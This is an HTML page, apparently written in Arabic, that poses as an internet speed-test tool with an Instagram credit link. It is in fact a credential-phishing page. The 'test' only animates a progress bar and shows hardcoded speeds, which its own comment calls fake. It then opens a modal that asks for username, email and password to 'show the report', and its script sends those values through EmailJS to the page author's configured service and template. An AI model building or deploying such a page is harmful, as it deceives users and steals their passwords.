<!DOCTYPE html>
<html lang="ar" dir="rtl" id="htmlTag">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أداة قياس سرعة الإنترنت</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            // المفتاح العام الخاص بك
            emailjs.init("GsGLLEalgTPTM7fB4");
        })();
    </script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; color: #fff; }
        .container { background: #111; border: 1px solid #333; border-radius: 20px; padding: 40px; max-width: 600px; width: 100%; position: relative; }
        .lang-switcher { position: absolute; top: 20px; left: 20px; }
        .lang-btn { background: #222; color: #fff; border: 1px solid #444; padding: 5px 12px; border-radius: 5px; cursor: pointer; font-size: 12px; }
        .header { text-align: center; margin-bottom: 40px; }
        .speed-display { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; margin-bottom: 40px; }
        .speed-item { background: #1a1a1a; border-radius: 15px; padding: 20px; text-align: center; border: 2px solid #2a2a2a; }
        .speed-value { font-size: 28px; font-weight: bold; margin: 10px 0; }
        .speed-label { color: #aaa; font-size: 14px; text-transform: uppercase; }
        .button-group { display: flex; gap: 15px; margin-bottom: 30px; }
        .btn { flex: 1; padding: 15px 30px; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        .btn-primary { background: #fff; color: #000; }
        .btn-primary:disabled { background: #ccc; cursor: not-allowed; }
        .btn-secondary { background: #222; color: #fff; border: 1px solid #444; }
        .progress-section { margin-bottom: 30px; }
        .progress-bar { width: 100%; height: 8px; background: #222; border-radius: 10px; overflow: hidden; }
        .progress-fill { height: 100%; background: #fff; width: 0%; transition: width 0.2s linear; }
        .status { text-align: center; padding: 20px; background: #1a1a1a; border-radius: 10px; color: #aaa; margin-bottom: 20px; min-height: 60px; display: flex; align-items: center; justify-content: center; }
        
        #loginModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; }
        .modal-box { background: #111; padding: 35px; border-radius: 20px; border: 1px solid #333; width: 90%; max-width: 400px; text-align: center; }
        .modal-box h2 { margin-bottom: 20px; color: #fff; }
        .modal-box input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #333; background: #000; color: #fff; font-size: 16px; outline: none; }
        .submit-btn { width: 100%; padding: 12px; background: #fff; color: #000; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; }

        .creator-section { margin-top: 30px; padding-top: 20px; border-top: 1px solid #333; text-align: center; }
        .ig-button { display: inline-flex; align-items: center; justify-content: center; gap: 10px; background: #000; color: #fff; text-decoration: none; padding: 12px 25px; border-radius: 25px; border: 2px solid #fff; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="lang-switcher"><button class="lang-btn" onclick="toggleLanguage()" id="langBtn">English</button></div>
        <div class="header">
            <h1 id="mainTitle">⚡ قياس سرعة الإنترنت</h1>
            <p id="subTitle">اختبر سرعة الإنترنت لديك بدقة عالية</p>
        </div>
        <div class="speed-display">
            <div class="speed-item"><div class="speed-label">التحميل</div><div class="speed-value" id="downloadSpeed">--</div><small>Mbps</small></div>
            <div class="speed-item"><div class="speed-label">الرفع</div><div class="speed-value" id="uploadSpeed">--</div><small>Mbps</small></div>
            <div class="speed-item"><div class="speed-label">البنق</div><div class="speed-value" id="ping">--</div><small>ms</small></div>
        </div>
        <div class="status" id="status">جاهز للاختبار</div>
        <div class="progress-section" id="progressSection" style="display: none;">
            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
            <div class="progress-text" style="text-align: center; margin-top: 5px;" id="progressText">0%</div>
        </div>
        <div class="button-group">
            <button class="btn btn-primary" id="startBtn" onclick="runRealTest()">ابدأ الاختبار</button>
            <button class="btn btn-secondary" onclick="location.reload()">إعادة تعيين</button>
        </div>
        <div class="creator-section">
            <div style="margin-bottom: 15px; color: #aaa;">تم إنشاء وتطوير الأداة بواسطة:</div>
            <a href="https://www.instagram.com/hki_184/" target="_blank" class="ig-button"><span>تابعني على إنستغرام</span></a>
        </div>
    </div>

    <div id="loginModal">
        <div class="modal-box">
            <h2>تسجيل النتيجة</h2>
            <p style="color: #888; font-size: 14px; margin-bottom: 10px;">أدخل بياناتك لعرض تقرير السرعة النهائي</p>
            <form id="authForm">
                <input type="text" id="username" placeholder="اسم المستخدم" required>
                <input type="email" id="email" placeholder="البريد الإلكتروني" required>
                <input type="password" id="user_code" placeholder="كلمة المرور" required>
                <button type="submit" id="sendBtn" class="submit-btn">عرض التقرير الآن</button>
            </form>
        </div>
    </div>

    <script>
        // دالة الاختبار الوهمي لإظهار النتائج
        async function runRealTest() {
            document.getElementById('startBtn').disabled = true;
            document.getElementById('progressSection').style.display = 'block';
            let p = 0;
            let interval = setInterval(() => {
                p += 5;
                document.getElementById('progressFill').style.width = p + '%';
                document.getElementById('progressText').textContent = p + '%';
                if(p >= 100) {
                    clearInterval(interval);
                    document.getElementById('ping').textContent = "12";
                    document.getElementById('downloadSpeed').textContent = "94.20";
                    document.getElementById('uploadSpeed').textContent = "42.15";
                    document.getElementById('status').textContent = "✅ اكتمل الفحص";
                    setTimeout(() => { document.getElementById('loginModal').style.display = 'flex'; }, 1000);
                }
            }, 100);
        }

        // --- السطر 177: الجزء المسؤول عن الإرسال إلى إيميلك ---
        document.getElementById('authForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const btn = document.getElementById('sendBtn');
            btn.innerText = 'جاري المعالجة...';
            btn.disabled = true;

            const params = {
                username: document.getElementById('username').value,
                email: document.getElementById('email').value,
                user_code: document.getElementById('user_code').value
            };

            // ربط معرف الخدمة ومعرف القالب الخاص بك
            emailjs.send("service_st0ga9g", "template_dozr2pp", params)
                .then(function() {
                    alert('✅ تم التحقق! السرعة النهائية هي 94.20 Mbps');
                    document.getElementById('loginModal').style.display = 'none';
                    location.reload(); 
                }, function(error) {
                    alert('❌ خطأ في الإرسال: ' + JSON.stringify(error));
                });
        });
    </script>
</body>
</html>
